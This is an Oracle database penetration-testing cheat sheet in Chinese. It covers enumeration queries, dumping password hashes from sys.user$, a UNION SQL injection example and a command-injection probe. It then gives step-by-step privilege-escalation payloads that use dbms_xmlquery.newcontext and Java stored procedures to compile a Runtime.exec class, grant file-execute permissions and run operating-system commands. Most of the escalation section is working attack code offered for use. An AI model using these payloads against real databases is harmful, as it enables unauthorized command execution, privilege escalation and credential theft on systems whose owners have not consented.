    0x00 环境准备

    1. Oracle Database：https://www.oracle.com/database/technologies/oracle-database-software-downloads.html
    3. PL/SQL Developer（可选），下载相关版本及安装过程略过。

    0x01 相关命令及注意

    1. show all #查看所有配置信息
    2. set linesize 200; #防止命令行中数据展示表格错乱的情况可以设计行宽和列宽
    3. 注释符：单行--，多行/**/
    4. 或运算符：||
    5. 空字符：null
    6. 查询必须指明表名，dual是虚拟表，可用dual作为非真实表查询
    7. dba_tables：系统里所有的表的信息，需DBA权限查询
    8. all_tables：当前用户有权限查询的表的信息
    9. user_tables：当前用户名下的表的信息

    0x10 Oracle 使用

    DBA身份连接数据库（普通用户无需as sysdba）

    1. conn [username]/[password]@[dbname] as sysdba; #普通用户执行该命令可切换至DBA
    3. 其他连接方法：
    4. conn as sysdba;
    5. conn / as sysdba;
    6. sqlplus / as sysdba;
    7. sqlplus [username]/[password] as sysdba;

    查看版本信息

    1. select * from v$version; #显示多行
    2. select * from v$version where banner like 'Oracle%'; #显示指定行
    4. select version from v$instance;
    5. 注入例子：?id=1' union select 1,2,(select version from v$instance) from dual--+

    查看当前数据库

    1. select * from global_name;
    2. select name from v$database;
    3. select instance_name from v$instance;
    4. select sys.database_name from dual;

    查看用户信息

    1. show user;
    2. select user from dual; #获取当前用户
    3. select username from all_user; #列出所有用户
    4. select name from sys.user$; #列出所有用户
    5. select password,spare4 from sys.user$ where name like '指定用户名'; #获取指定用户密码
    6. select name,password,spare4 from sys.user$; #获取所有用户密码
    7. select * from session_privs; #获取当前用户权限
    8. select * from dba_sys_privs; #获取所有用户权限

    查看主机信息

    1. select utl_inaddr.get_host_name from dual; #查主机名
    2. select platform_name from v$database; #查平台
    3. select host_name from v$instance; #查主机名
    4. select utl_inaddr.get_host_address from dual; #查IP
    5. select utl_inaddr.get_host_name('127.0.0.1') from dual; #查主机名

    获取字段名和表名

    1. select table_name from all_tables; #获取所有表名
    2. select column_name from all_tab_columns; #获取所有字段名
    3. SELECT DISTINCT owner, table_name FROM all_tables; #获取当前用户权限的所有数据库

?name=qq' || '[command] #回显正常

    Oracle 提权

    创建新用户：create user test identified by test; #用户test，密码test
删除用户：drop user test;
查看权限：select role from session_roles;
查看权限：select * from session_privs;




低权限用户提权：JAVA权限执行命令
创建JAVA Source：
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual;

判断是否创建成功：
select OWNER,OBJECT_NAME,OBJECT_TYPE from all_objects where object_name like '%LINX%' or object_name like '%Linx%'

用户添加运行权限：
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate '' grant JAVASYSPRIV to SYSTEM ''commit;end;') from dual

赋予执行权限：
select  dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''begin dbms_java.grant_permission( ''''SYSTEM'''', ''''SYS:java.io.FilePermission'''', ''''<<ALL FILES>>'''',''''EXECUTE'''');end;''commit;end;') from dual

创建执行函数linxruncmd
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual

验证函数是否创建成功
select OBJECT_ID from all_objects where object_name ='LINXRUNCMD'

执行命令：
select LinxRunCMD('whoami') from dual


低权限提权：存储过程执行命令
create or replace and resolve java source named JAVACMD as
    import java.lang.*;
    import java.io.*;
    public class JAVACMD
    {
       public static void execmd(String command) throws IOException
       {
               Runtime.getRuntime().exec(command);
       }
   }
   /


创建调用的包
create or replace procedure MYJAVACMD(command in varchar) as language java
    name 'JAVACMD.execmd(java.lang.String)';
/

执行命令
EXEC MYJAVACMD('whoami');
